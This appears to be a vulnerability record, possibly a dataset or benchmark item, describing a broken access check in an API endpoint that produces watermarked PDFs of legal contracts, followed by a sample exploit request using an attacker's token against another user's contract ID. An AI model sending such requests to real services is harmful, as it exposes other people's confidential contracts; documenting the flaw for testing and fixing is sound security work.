diagnosis: Generates and returns an on-the-fly watermarked PDF of a legal contract using contract_id. The endpoint does not verify whether user.id is a signatory or owner of the contract.
exploit_request:
POST /api/contracts/992/watermark-pdf HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_token>
Content-Type: application/json

{"watermark_text": "CONFIDENTIAL"}
